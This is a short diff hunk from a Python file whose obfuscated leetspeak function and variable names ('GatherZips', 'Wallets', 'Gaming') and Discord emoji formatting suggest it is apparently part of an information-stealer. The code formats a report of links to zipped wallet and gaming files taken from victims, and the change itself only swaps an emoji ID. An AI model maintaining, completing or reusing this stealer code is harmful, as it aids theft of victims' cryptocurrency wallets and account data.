@@ -675,7 +675,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         for i in W411375Z1p:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(W411375Z1p) == 0:
-        ga = "<:geng_black:1096094415250018355>  •  Gaming\n"
+        ga = "<:blackgengar:1111366900690202624>  •  Gaming\n"
         for i in G4M1N6Z1p:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(O7H3rZ1p) == 0:
